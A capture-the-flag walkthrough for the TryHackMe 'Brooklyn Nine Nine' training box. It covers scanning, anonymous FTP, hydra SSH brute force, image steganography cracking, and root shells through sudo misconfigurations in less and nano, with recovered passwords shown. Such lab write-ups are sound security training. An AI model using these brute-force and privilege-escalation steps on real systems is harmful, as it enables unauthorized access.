---
clayout: ctf
title: Brooklyn Nine Nine
type: TryHackMe
date: 2025-08-30
level: Easy
icon: /ctf/tryhackme/brooklyn-nine-nine/icon-room.png
image: /ctf/tryhackme/brooklyn-nine-nine/icon-room.png
banner: /ctf/tryhackme/brooklyn-nine-nine/banner.png
description: This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.
ctf-link: https://tryhackme.com/room/brooklynninenine
---

## Challenge Overview

The target machine exposes multiple services, including FTP (with anonymous login), SSH, and HTTP. Enumeration revealed weak credentials and hidden information within an image file, ultimately leading to multiple privilege escalation paths.

## Enumeration

### Nmap Scan

We can start by running a `nmap` scan to enumerate the services running on the target machine.

```bash
nmap -A -oN nmap.txt 10.10.131.210
```

**Scan results:**

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
```

**Key findings:**

* **FTP**: Anonymous access enabled.
* **SSH**: OpenSSH 7.6p1.
* **HTTP**: Apache 2.4.29 with a basic HTML page.

### FTP Enumeration

The anonymous login is enabled on the FTP service.

```bash
ftp 10.10.131.210
```

Listing files reveals `note_to_jake.txt`:

```text
From Amy,

Jake please change your password. 
It is too weak and holt will be mad if someone hacks into the nine nine
```

This suggests two valid usernames: **jake**, **holt** and **amy**.

## Initial Access

### Path 1: SSH Brute Force

Given the hint about weak passwords, we can try to brute-force the password of the user `jake` using SSH.

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.131.210 ssh
```

**Result:**

```bash
[22][ssh] host: 10.10.131.210   login: jake   password: 987654321
```

We can now login to the user `jake` using SSH.

```bash
ssh jake@10.10.131.210
jake@brookly_nine_nine:~$ id
uid=1000(jake) gid=1000(jake) groups=1000(jake)
```

### Path 2: Web + Steganography

The HTTP service displays a static page with the following HTML comment:

```html
<!-- Have you ever heard of steganography? -->
```

Download the background image `brooklyn99.jpg` for analysis.

Using `stegcracker`:

```bash
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

**Result:**

```bash
Successfully cracked file with password: admin
Your file has been written to: brooklyn99.jpg.out
```

Extracted credentials:

```text
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

SSH access as `holt`:

```bash
ssh holt@10.10.131.210
holt@brookly_nine_nine:~$ id
uid=1002(holt) gid=1002(holt) groups=1002(holt)
```

> [!NOTE] User flag
> `/home/holt/user.txt`

## Privilege Escalation

### Path 1: Sudo Misconfiguration (`less` as jake)

Checking `sudo` rights for `jake`:

```bash
sudo -l
```

**Output:**

```bash
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

According to [GTFOBins](https://gtfobins.github.io/gtfobins/less/#sudo), this can be abused to spawn a shell:

```bash
sudo less /etc/profile
!/bin/sh
```

We can now run the command to get root access:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Path 2: Sudo Misconfiguration (`nano` as holt)

Checking `sudo` rights for `holt`:

```bash
sudo -l
```

**Output:**

```bash
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

As shown on [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo), `nano` can also be leveraged to escape into a root shell:

```bash
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

We can now run the command to get root access:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

> [!NOTE] Root flag
> `/root/root.txt`
